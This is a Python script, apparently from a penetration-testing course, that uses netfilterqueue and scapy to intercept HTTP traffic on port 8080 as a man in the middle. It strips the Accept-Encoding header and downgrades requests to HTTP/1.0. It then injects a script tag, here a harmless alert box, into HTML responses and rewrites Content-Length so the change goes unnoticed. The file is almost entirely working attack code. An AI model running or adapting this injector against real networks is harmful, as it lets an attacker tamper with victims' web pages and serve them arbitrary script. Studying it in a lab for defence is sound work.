#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re
import subprocess
import optparse


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 8080:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 8080:
            print("[+] Response")
            injection_code = "<script>alert('Hello! I am an alert box!!');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

            #print(scapy_packet.show())

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


# try:
#     setup_iptables()
#     options = get_arguments()
#     file_type = options.type
#     file_location = options.location
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
# except KeyboardInterrupt:
#     print("\n[+]Clearing IP Tables and exiting...")
#     flush_iptables()
#     print("\n[+] Done.")